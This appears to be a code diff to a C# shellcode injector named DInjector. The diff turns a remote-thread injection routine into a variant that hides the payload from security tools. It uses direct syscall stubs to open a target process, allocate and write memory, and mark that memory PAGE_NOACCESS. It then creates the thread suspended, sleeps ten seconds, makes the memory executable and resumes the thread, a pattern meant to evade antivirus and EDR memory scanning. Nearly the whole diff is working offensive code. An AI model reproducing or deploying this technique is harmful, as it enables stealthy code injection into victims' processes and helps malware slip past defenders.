@@ -5,7 +5,7 @@ using DI = DInvoke;
 
 namespace DInjector
 {
-    class RemoteThread
+    class RemoteThreadSuspended
     {
         [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         delegate DI.Data.Native.NTSTATUS NtOpenProcess(
@@ -53,6 +53,11 @@ namespace DInjector
             int maximumStackSize,
             IntPtr attributeList);
 
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        delegate DI.Data.Native.NTSTATUS NtResumeThread(
+            IntPtr ThreadHandle,
+            ref uint SuspendCount);
+
         [StructLayout(LayoutKind.Sequential, Pack = 0)]
         struct OBJECT_ATTRIBUTES
         {
@@ -95,11 +100,11 @@ namespace DInjector
 
             if (ntstatus == 0)
             {
-                Console.WriteLine("(RemoteThread) [+] NtOpenProcess");
+                Console.WriteLine("(RemoteThreadSuspended) [+] NtOpenProcess");
             }
             else
             {
-                Console.WriteLine($"(RemoteThread) [-] NtOpenProcess: {ntstatus}");
+                Console.WriteLine($"(RemoteThreadSuspended) [-] NtOpenProcess: {ntstatus}");
             }
 
             #endregion
@@ -122,11 +127,11 @@ namespace DInjector
 
             if (ntstatus == 0)
             {
-                Console.WriteLine("(RemoteThread) [+] NtAllocateVirtualMemory, PAGE_READWRITE");
+                Console.WriteLine("(RemoteThreadSuspended) [+] NtAllocateVirtualMemory, PAGE_READWRITE");
             }
             else
             {
-                Console.WriteLine($"(RemoteThread) [-] NtAllocateVirtualMemory, PAGE_READWRITE: {ntstatus}");
+                Console.WriteLine($"(RemoteThreadSuspended) [-] NtAllocateVirtualMemory, PAGE_READWRITE: {ntstatus}");
             }
 
             #endregion
@@ -150,18 +155,18 @@ namespace DInjector
 
             if (ntstatus == 0)
             {
-                Console.WriteLine("(RemoteThread) [+] NtWriteVirtualMemory");
+                Console.WriteLine("(RemoteThreadSuspended) [+] NtWriteVirtualMemory");
             }
             else
             {
-                Console.WriteLine($"(RemoteThread) [-] NtWriteVirtualMemory: {ntstatus}");
+                Console.WriteLine($"(RemoteThreadSuspended) [-] NtWriteVirtualMemory: {ntstatus}");
             }
 
             Marshal.FreeHGlobal(buffer);
 
             #endregion
 
-            #region NtProtectVirtualMemory (PAGE_EXECUTE_READ)
+            #region NtProtectVirtualMemory (PAGE_NOACCESS)
 
             stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtProtectVirtualMemory");
             NtProtectVirtualMemory sysNtProtectVirtualMemory = (NtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtProtectVirtualMemory));
@@ -170,21 +175,21 @@ namespace DInjector
                 hProcess,
                 ref baseAddress,
                 ref regionSize,
-                DI.Data.Win32.WinNT.PAGE_EXECUTE_READ,
+                DI.Data.Win32.WinNT.PAGE_NOACCESS,
                 out uint _);
 
             if (ntstatus == 0)
             {
-                Console.WriteLine("(RemoteThread) [+] NtProtectVirtualMemory, PAGE_EXECUTE_READ");
+                Console.WriteLine("(RemoteThreadSuspended) [+] NtProtectVirtualMemory, PAGE_NOACCESS");
             }
             else
             {
-                Console.WriteLine($"(RemoteThread) [-] NtProtectVirtualMemory, PAGE_EXECUTE_READ: {ntstatus}");
+                Console.WriteLine($"(RemoteThreadSuspended) [-] NtProtectVirtualMemory, PAGE_NOACCESS: {ntstatus}");
             }
 
             #endregion
 
-            #region NtCreateThreadEx
+            #region NtCreateThreadEx (CREATE_SUSPENDED)
 
             stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtCreateThreadEx");
             NtCreateThreadEx sysNtCreateThreadEx = (NtCreateThreadEx)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtCreateThreadEx));
@@ -198,7 +203,7 @@ namespace DInjector
                 hProcess,
                 baseAddress,
                 IntPtr.Zero,
-                false,
+                true, // CREATE_SUSPENDED
                 0,
                 0,
                 0,
@@ -206,11 +211,62 @@ namespace DInjector
 
             if (ntstatus == 0)
             {
-                Console.WriteLine("(RemoteThread) [+] NtCreateThreadEx");
+                Console.WriteLine("(RemoteThreadSuspended) [+] NtCreateThreadEx, CREATE_SUSPENDED");
             }
             else
             {
-                Console.WriteLine($"(RemoteThread) [-] NtCreateThreadEx: {ntstatus}");
+                Console.WriteLine($"(RemoteThreadSuspended) [-] NtCreateThreadEx, CREATE_SUSPENDED: {ntstatus}");
+            }
+
+            #endregion
+
+            #region Thread.Sleep
+
+            System.Threading.Thread.Sleep(10000);
+
+            #endregion
+
+            #region NtProtectVirtualMemory (PAGE_EXECUTE_READ)
+
+            stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtProtectVirtualMemory");
+            sysNtProtectVirtualMemory = (NtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtProtectVirtualMemory));
+
+            ntstatus = sysNtProtectVirtualMemory(
+                hProcess,
+                ref baseAddress,
+                ref regionSize,
+                DI.Data.Win32.WinNT.PAGE_EXECUTE_READ,
+                out uint _);
+
+            if (ntstatus == 0)
+            {
+                Console.WriteLine("(RemoteThreadSuspended) [+] NtProtectVirtualMemory, PAGE_EXECUTE_READ");
+            }
+            else
+            {
+                Console.WriteLine($"(RemoteThreadSuspended) [-] NtProtectVirtualMemory, PAGE_EXECUTE_READ: {ntstatus}");
+            }
+
+            #endregion
+
+            #region NtResumeThread
+
+            stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtResumeThread");
+            NtResumeThread sysNtResumeThread = (NtResumeThread)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtResumeThread));
+
+            uint suspendCount = 0;
+
+            ntstatus = sysNtResumeThread(
+                hThread,
+                ref suspendCount);
+
+            if (ntstatus == 0)
+            {
+                Console.WriteLine("(RemoteThreadSuspended) [+] NtResumeThread");
+            }
+            else
+            {
+                Console.WriteLine($"(RemoteThreadSuspended) [-] NtResumeThread: {ntstatus}");
             }
 
             #endregion
